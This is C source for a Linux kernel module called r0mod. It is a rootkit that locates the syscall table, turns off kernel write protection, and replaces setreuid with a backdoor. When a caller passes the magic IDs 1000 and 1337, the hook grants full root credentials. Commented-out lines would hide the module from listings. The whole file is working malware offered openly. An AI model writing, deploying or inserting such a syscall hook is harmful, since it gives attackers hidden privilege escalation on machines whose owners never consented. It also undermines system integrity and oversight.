#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/module.h>

#include <linux/unistd.h>   // syscalls
#include <linux/syscalls.h> // syscalls

#include <asm/paravirt.h>   // write_cr0

#include <r0mod/global.h>

#define SEARCH_START    PAGE_OFFSET
#define SEARCH_END      PAGE_SIZE - 0x01 //ULONG_MAX //PAGE_OFFSET + 0xffffffff

unsigned long *syscall_table;

asmlinkage int (*orig_setreuid)(uid_t ruid, uid_t euid);
asmlinkage int new_setreuid(uid_t ruid, uid_t euid)
{
    printk("[trying]: ruid == %d && euid == %d\n", ruid, euid);

    if((ruid == 1000) && (euid == 1337))
    {
        printk("[Correct]: You got the correct ids.\n");
        commit_creds(prepare_kernel_cred(0));

        return new_setreuid(0, 0);
    }

    return orig_setreuid(ruid, euid);
}

unsigned long *find_sys_call_table(void)
{
    unsigned long i;

    for(i = SEARCH_START; i < SEARCH_END; i += sizeof(void *))
    {
        unsigned long *sys_call_table = (unsigned long *)i;

        if(sys_call_table[__NR_close] == (unsigned long)sys_close)
        {
            printk("sys_call_table found @ %lx\n", (unsigned long)sys_call_table);
            return sys_call_table;
        }
    }

    return NULL;
}

static int __init r0mod_init(void)
{
    printk("Module starting...\n");

    //printk("Hiding module object.\n");
    //list_del_init(&__this_module.list);
    //kobject_del(&THIS_MODULE->mkobj.kobj);

    printk("Search Start: %lx\n", SEARCH_START);
    printk("Search End:   %lx\n", SEARCH_END);

    if((syscall_table = (void *)find_sys_call_table()) == NULL)
    {
        printk("syscall_table == NULL\n");
        return -1;
    }

    printk("sys_call_table hooked @ %lx\n", (unsigned long)syscall_table);

    write_cr0(read_cr0() & (~0x10000));

    orig_setreuid = (void *)syscall_table[__NR_setreuid];
    syscall_table[__NR_setreuid] = (unsigned long)new_setreuid;

    write_cr0(read_cr0() | 0x10000);

    return 0;
}


static void __exit r0mod_exit(void)
{
    printk("Module ending...\n");

    if(syscall_table != NULL)
    {
        write_cr0(read_cr0() & (~0x10000));

        syscall_table[__NR_setreuid] = (unsigned long)orig_setreuid;

        write_cr0(read_cr0() | 0x10000);
    }
}

MODULE_LICENSE("GPL");
module_init(r0mod_init);
module_exit(r0mod_exit);
